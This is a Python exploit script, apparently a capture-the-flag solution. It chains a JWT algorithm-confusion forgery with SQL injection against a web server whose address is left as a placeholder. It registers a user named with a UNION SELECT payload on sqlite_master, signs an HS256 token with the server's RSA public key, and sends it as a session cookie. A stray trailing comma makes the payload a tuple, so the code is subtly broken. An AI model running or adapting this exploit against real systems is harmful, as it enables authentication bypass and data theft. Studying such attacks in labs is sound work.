import requests
import jwt

server_ip = "<INSERT IP AND PORT HERE>"
sqli_payload = "user' AND 1=2 UNION SELECT 1,group_concat(tbl_name),3 from sqlite_master--",

'''
In order to deliver the SQLI payload, the user must already exist in the database, 
so we create it here.
'''
def create_user(username):
    payload = {'username': username, 'password': 'aaa', 'register': 'Register'}
    path = 'auth'
    response = requests.post(server_ip+path, data = payload)
    return response


'''
The reason this server is vulnerable is because the function that verifies the JWT 
accepts JWTs signed using the (symmetric) HS256 algorithm, but is passed the 
public key that corresponds to the private key which it uses to sign JWTs using the 
RS256 algorithm. Essentially, it is misconfigured to accept the public key as the shared 
secret of an HS256 JWT, and since we have the public key we can forge our own tokens for any 
username we like.
'''
def create_jwt(username):
    data = {
        "username": username,
        "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
        "iat": 1615293941
    }
    token = jwt.encode(data, data['pk'], algorithm="HS256")
    return token

def deliver_payload(username):
    create_user(username)
    token = create_jwt(username)
    response = requests.get(server_ip, cookies = {'session': token})
    print(response.text)

deliver_payload(sqli_payload)
